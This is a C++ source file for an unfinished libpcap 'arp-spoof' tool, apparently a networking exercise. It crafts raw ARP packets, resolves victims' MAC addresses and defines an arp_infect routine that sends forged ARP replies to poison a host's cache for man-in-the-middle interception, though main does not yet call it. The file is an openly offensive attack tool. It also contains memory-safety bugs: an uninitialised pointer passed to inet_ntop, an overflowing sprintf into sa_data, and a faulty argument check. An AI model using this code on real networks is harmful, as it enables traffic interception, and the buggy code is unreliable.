#include <cstdio>
#include <iostream>
#include <pcap.h>
#include <vector>
#include <map>

#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

#define A_SIZE 10
using namespace std;

// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

map<Ip, Mac> arp_table;

struct Flow
{
	Ip sender_ip;
	Mac sender_mac;
	Ip target_ip;
	Mac target_mac;
};


void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int send_arp(pcap_t* handle, Mac ether_dMac, Mac ether_sMac, uint16_t opcode, Mac arp_sMac, Ip sIp, Mac arp_dMac, Ip dIp)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dMac;
	packet.eth_.smac_ = ether_sMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	// packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.op_ = htons(opcode);
	packet.arp_.smac_ = arp_sMac;
	packet.arp_.sip_ = htonl(sIp);
	packet.arp_.tmac_ = arp_dMac;
	packet.arp_.tip_ = htonl(dIp);

	return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

Ip get_my_ip(char* dev)
{
	int fd;
	struct ifreq ifr;
	char* ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));
	
	return Ip(ip);
}
Mac get_my_mac(char* dev)
{
	int fd;
	char* mac;

	struct ifreq ifr;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , dev , IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (char *)ifr.ifr_hwaddr.sa_data;
	sprintf(mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0]&0xff, mac[1]&0xff, mac[2]&0xff, mac[3]&0xff, mac[4]&0xff, mac[5]&0xff);

	return Mac(mac);
}
Mac get_sender_mac(pcap_t* handle, Ip sender_ip, Ip my_ip, Mac my_mac){

	int res = send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), my_mac, ArpHdr::Request,
					   my_mac, my_ip, Mac("00:00:00:00:00:00"), sender_ip);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	EthArpPacket *etharp;

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		if (packet == NULL) continue;
        
		etharp = (EthArpPacket *) packet;
		if(etharp->eth_.type() != EthHdr::Arp) continue;

		if(etharp->arp_.hrd() != ArpHdr::ETHER || etharp->arp_.pro() != EthHdr::Ip4 || etharp->arp_.op() != ArpHdr::Reply) {
			continue;
		}

		if(Mac(my_mac) == etharp->arp_.tmac() && Ip(my_ip) == etharp->arp_.tip() && Ip(sender_ip) == etharp->arp_.sip()) {
			break;
		}

	}

	Mac sender_mac = etharp->arp_.smac();

	return sender_mac;
}

int arp_infect(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip my_ip, Mac my_mac, Ip target_ip){

	int res = send_arp(handle, sender_mac, my_mac, ArpHdr::Reply, Mac(my_mac), 
						target_ip, sender_mac, sender_ip);
		
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	return res;
}

// void relay(pcap_t* handle){
	
// }


int main(int argc, char* argv[]) {
	if (argc < 4 && argc % 2 != 0) {
		usage();
		return -1;
	}

	Ip attacker_ip;
	Mac attacker_mac;
	Flow flow[A_SIZE];

	int num_of_flow = (argc -2) / 2;
	
	char* dev = argv[1];
	for(int i = 2 ; i < argc; i+=2){
		flow[(i-2) / 2].sender_ip = Ip(argv[i]);
		flow[(i-2) / 2].target_ip = Ip(argv[i+1]);
	}

	//print info
	for(int i = 0 ; i < num_of_flow; i++){
		cout << i+1 << " : "<< std::string(flow[i].sender_ip) << " -> " << std::string(flow[i].target_ip) << endl;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//get attacker's info
	attacker_ip = get_my_ip(dev);
	attacker_mac = get_my_mac(dev);

	cout << "attacker's ip : " << std::string(attacker_ip) << endl;
	cout << "attacker's mac : " << std::string(attacker_mac) << endl;

	//get sender's info
	for(int i = 0 ; i < num_of_flow; i++)
	{
		if(arp_table.find(flow[i].sender_ip) != arp_table.end())
			continue;

		flow[i].sender_mac = get_sender_mac(handle, flow[i].sender_ip, attacker_ip, attacker_mac);
		arp_table.insert(pair<Ip, Mac>(flow[i].sender_ip, flow[i].sender_mac));
	}

	//print arp_table
	for(auto iter = arp_table.begin(); iter != arp_table.end(); iter++)
	{
		cout << std::string(iter->first) << " " << std::string(iter->second) << endl;
	}
	
	
	pcap_close(handle);
}
